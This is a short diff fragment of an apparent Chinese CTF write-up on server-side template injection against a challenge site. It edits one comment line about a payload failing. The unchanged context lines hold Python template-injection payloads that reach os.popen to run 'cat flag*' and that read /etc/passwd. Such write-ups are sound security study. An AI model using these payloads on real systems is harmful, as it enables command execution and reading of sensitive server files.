@@ -8,7 +8,7 @@ http://1ae78b0533574fb6b763eccb831e0b3175b19e935cd04dd7.changame.ichunqiu.com/?n
 ```
 aa{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
 ```
-en， 果然不能用,大概到func_globals['linecache']就会报错，好像是没有globals，刚刚学了这个就没有这个，换一个新的payload可以用的payl
+en， 果然不能用,大概到func_globals['linecache']就会报错，好像是没有globals，刚刚学了这个就没有这个，换一个新的payload
 ```
 #读文件：
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
